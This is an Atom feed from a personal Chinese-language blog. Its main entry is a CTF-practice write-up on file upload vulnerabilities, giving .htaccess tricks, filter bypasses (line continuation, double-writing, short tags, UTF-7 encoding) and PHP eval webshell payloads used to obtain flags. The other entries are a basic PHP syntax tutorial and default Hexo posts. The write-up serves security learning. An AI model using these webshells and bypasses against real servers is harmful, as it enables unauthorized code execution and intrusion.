<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://z2762331820.github.io/atom.xml" rel="self"/>
  
  <link href="https://z2762331820.github.io/"/>
  <updated>2020-10-30T16:28:03.200Z</updated>
  <id>https://z2762331820.github.io/</id>
  
  <author>
    <name>Dynamite boom</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NOTE</title>
    <link href="https://z2762331820.github.io/2020/10/27/NOTE/"/>
    <id>https://z2762331820.github.io/2020/10/27/NOTE/</id>
    <published>2020-10-27T10:40:45.000Z</published>
    <updated>2020-10-30T16:28:03.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><blockquote><p>文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。</p><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p><p>通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</p><p>然后这周就做题练习qwq</p><h2 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>.htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。</p><p>例题upload6</p><p>先上传下.htaccess的文件，发现无法上传</p><p>网站过滤application，使用换行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure><p>然后上传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>成功得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>例题upload3</p><p>上传文件的内容中的php，POST，eval替换为空</p><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-pphphp .aaa</span><br></pre></td></tr></table></figure><p>1.aaa</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure><p>最后连接剑蚁，查找flag</p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><?PHP被过滤，可使用php版本5使用短标签绕过![aLcYOU](E:\blog\source\_posts\NOTE\aLcYOU.png)例题upload2先上传.htaccess ，之后再上传1.aaa<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table>## 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了`<?`而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下`<?php`形式），这时候可以使用`.htaccess`解码对应的文件，例如可以使用UTF-7进行解码：(http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）https://www.novel.tools/encode/UTF-7例题upload4先上传.htaccess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table>![屏幕截图 2020-10-31 000905](E:\blog\source\_posts\NOTE\屏幕截图 2020-10-31 000905.png)在上传1.aaa![屏幕截图 2020-10-31 000922](E:\blog\source\_posts\NOTE\屏幕截图 2020-10-31 000922.png)链接蚁剑得到flag]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://z2762331820.github.io/2020/10/07/PHP/"/>
    <id>https://z2762331820.github.io/2020/10/07/PHP/</id>
    <published>2020-10-07T05:09:36.163Z</published>
    <updated>2020-10-26T08:40:53.173Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: PHP基本语法<br>date: 2020-10-07 13:09:36<br>tags:</p><h1 id="—基础PHP语法"><a href="#—基础PHP语法" class="headerlink" title="—基础PHP语法"></a>—基础PHP语法</h1><p>PHP脚本可放置于文档中的任何位置</p><p>PHP脚本以<?php开头，以?>结尾</p><p>如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//此处为代码</span></span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure><p>PHP 文件的默认文件扩展名是 “.php”。</p><p>PHP 文件通常包含 HTML 标签以及一些 PHP 脚本代码</p><p><strong>echo</strong>可以打印信息，类似于printf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的第一张 PHP 页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><img src="/2020/10/07/PHP/Users\86152\Desktop\屏幕截图 2020-10-19 170926.png" style="zoom:67%;"><p><strong>指令分隔符</strong></p><p>PHP 需要在每个语句后用分号结束指令。一段 PHP   代码中的结束标记隐含表示了一个分号；在一个 PHP   代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is a test&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;This is a test&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;We omitted the last closing tag&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件末尾的 PHP 代码段结束标记可以不要，有些情况下当使用     <a href="https://www.php.net/manual/zh/function.include.php">include</a> 或者 <a href="https://www.php.net/manual/zh/function.require.php">require</a>     时省略掉会更好些，这样不期望的空白符就不会出现在文件末尾，之后仍然可以输出响应标头。在使用输出缓冲时也很便利，就不会看到由包含文件生成的不期望的空白符。    </p><p><strong>PHP中的注释</strong></p><p>PHP 代码中的注释不会被作为程序来读取和执行。它唯一的作用是供代码编辑者阅读。</p><p>PHP支持三种注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 这是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是多行注释块</span></span><br><span class="line"><span class="comment">它横跨了</span></span><br><span class="line"><span class="comment">多行</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>PHP变量规则</strong></p><ul><li>变量以 $ 符号开头，其后是变量的名称</li><li>变量名称必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线（A-z、0-9 以及  _）</li><li><strong>变量名称对大小写敏感</strong>（$y 与 $Y 是两个不同的变量）</li></ul><p><strong>实例创建PHP变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">6</span>;</span><br><span class="line">$z=$x+$y;</span><br><span class="line"><span class="keyword">echo</span> $z;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/10/07/PHP/Users\86152\Pictures\2020-08\t01e9a2a820aaf0e86d.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title: PHP基本语法&lt;br&gt;date: 2020-10-07 13:09:36&lt;br&gt;tags:&lt;/p&gt;
&lt;h1 id=&quot;—基础PHP语法&quot;&gt;&lt;a href=&quot;#—基础PHP语法&quot; class=&quot;headerlink&quot; title=&quot;—基础PHP语法&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://z2762331820.github.io/2020/10/07/%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://z2762331820.github.io/2020/10/07/%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
    <published>2020-10-07T02:29:33.000Z</published>
    <updated>2020-10-18T02:21:51.631Z</updated>
    
    <content type="html"><![CDATA[<p>=-=</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;=-=&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://z2762331820.github.io/2020/10/06/hello-world/"/>
    <id>https://z2762331820.github.io/2020/10/06/hello-world/</id>
    <published>2020-10-06T08:07:10.988Z</published>
    <updated>2020-10-06T08:07:10.988Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
